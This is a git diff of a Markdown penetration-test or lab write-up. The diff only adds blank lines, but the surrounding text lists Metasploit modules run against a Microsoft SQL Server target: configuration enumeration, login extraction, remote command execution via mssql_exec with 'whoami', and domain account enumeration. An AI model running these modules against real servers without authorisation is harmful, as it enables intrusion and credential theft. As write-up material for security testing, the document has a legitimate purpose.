@@ -320,7 +320,9 @@ We were able to enumerate following users and passwords:
 
 ### Enumerate MSSQL configuration:
     msf6: `use auxiliary/admin/mssql/mssql_enum`
+    
     msf6: `options`
+    
     msf6: `run:`
 
 We were able to enumerate following users with empty password:
@@ -331,19 +333,25 @@ password.
 ### Extract all MSSQL users:
     
 msf6: `use auxiliary/admin/mssql/mssql_enum_sql_logins`
+
 msf6: `exploit`
 ![grafik](https://github.com/user-attachments/assets/d314d84e-ae2a-4a08-9b9c-9bd762ea2905)
 
 ### Execute a command on the target machine using mssql_exec module:
 
 msf6: `use auxiliary/admin/mssql/mssql_exec`
+
 msf6: `set cmd whoami`
+
 msf6: `options`
+
 msf6: `run`
 ![grafik](https://github.com/user-attachments/assets/eb135ce7-65b4-4368-b037-6e3c83652a13)
 
 ### Running MSSQL enum domain accounts module to enumerate all available system users
+
 msf6: `use auxiliary/admin/mssql/mssql_enum_domain_accounts`
+
 msf6: `exploit`
 ![grafik](https://github.com/user-attachments/assets/ffcc3c24-605b-49b0-adfb-cfda09d879ec)
 ![grafik](https://github.com/user-attachments/assets/14e8b77a-eb7d-4447-87e7-de228b505389)
